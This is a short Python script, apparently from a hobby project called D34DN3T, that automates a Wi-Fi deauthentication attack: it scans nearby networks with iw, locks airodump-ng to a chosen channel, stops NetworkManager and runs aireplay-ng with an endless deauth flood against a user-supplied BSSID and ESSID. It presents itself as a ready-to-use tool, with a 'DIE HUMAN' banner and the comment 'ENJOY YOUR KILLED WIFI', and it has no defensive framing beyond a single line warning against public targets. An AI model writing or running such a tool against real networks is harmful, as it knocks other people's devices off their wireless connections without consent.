#A SCRIPT TO DDOS(DEAUTH) A NETWORK BY BSSID AND ESSID
#SCRIPT CREATED FOR D34DN3T PROJECT
#DO NOT USE THIS SCRIPT TARGETTING PUBLIC NETWORKS

#DONT FORGET TO RUN IT AS SUDO OTHERWISE IT WONT WORK
#1 First command will check for sudo (sudo -- root privileges)
#2 next it will scan the interface wlan0
#3 Next you will need to copy the bssid and essid, and remember the channel of the network
#channel is very important
#4 next it will ask you to input the channel {?}

#5 then it will run airodump to change the actual channel to a new one

#6 next it will turn off the NetworkManager service to dont be interrupted and to work properly with aireplay
#7 next it will run aireplay-ng and loop deauth

#ENJOY YOUR KILLED WIFI :)

import subprocess
import time
import os
import sys

class bcolors:
    HEADER    = '\033[95m'
    OKBLUE    = '\033[94m'
    OKGREEN   = '\033[92m'
    WARNING   = '\033[93m'
    FAIL      = '\033[91m'
    BOLD      = '\033[1m'
    UNDERLINE = '\033[4m'
    ENDC      = '\033[0m'

print(bcolors.BOLD + bcolors.FAIL + """
          .                                                      .
        .n                   .                 .                  n.
  .   .dP                  dP                   9b                 9b.    .
 4    qXb         .       dX                     Xb       .        dXp     t
dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
  `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
    `9XXXXXXXXXXXP' `9XX'   DIE    `98v8P'  HUMAN   `XXP' `9XXXXXXXXXXXP'
        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
                        )b.  .dbo.dP'`v'`9b.odb.  .dX(
                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
                     dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                    9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
                     `'      9XXXXXX(   )XXXXXXP      `'
                              XXXX X.`v'.X XXXX
                              XP^X'`b   d'`X^XX
                              X. 9  `   '  P )X
                              `b  `       '  d'
                               `             '


                        ,  , , ,    ,    .  . ,--, ,---. 
                        | /  | |    |    |\ |   /    |   
                        |<   | |    |    | \|  `.    |   
                        | \  | |    |    |  |    )   |   
                        '  ` ' `--' `--' '  ' `-'    '   

""")
#1
def sudo_check():
    if not 'SUDO_UID' in os.environ.keys():
        print("                 -> [-] Try running this program with sudo. <-")
        sys.exit()
sudo_check()



#globals
global iface
global bssid
global essid
global channel

#iface
wlan0 = "wlan0"

#interface
def interface_check():
    pass

#scan for essid + bssid + channel | 2 + 3
def iw_scan():
    print(bcolors.ENDC + bcolors.OKGREEN)
    subprocess.run(["iw","dev",wlan0,"scan"])
    x = input("Copy the BSSID, ESSID and Channel of the target network. Press Enter to continue.")
    change_channel_to()

#change the channel to whatever you put there, then ctrl+c to break | 3 + 4 + 5
def change_channel_to():
    changeChannel = input(str(bcolors.FAIL + "Channel >> "+ bcolors.HEADER))
    try:
        subprocess.run(["airodump-ng","-c",str(changeChannel),"wlan0"])
        print("CTRL+C to interrupt.")
        time.sleep(0.1)
        
    except KeyboardInterrupt:
        print("Stopped process.")
        deauther_attack()


#deauth | 6 + 7
def deauther_attack():
    bssid = input(str(bcolors.BOLD + bcolors.FAIL + "BSSID >> " + bcolors.ENDC + bcolors.OKBLUE))
    essid = input(str(bcolors.BOLD + bcolors.FAIL + "ESSID >> " + bcolors.ENDC + bcolors.OKBLUE))
    subprocess.run(["service","NetworkManager","stop"])
    subprocess.run(["aireplay-ng","--deauth", "0","-a",str(bssid),"-e", str(essid), "wlan0"])


iw_scan()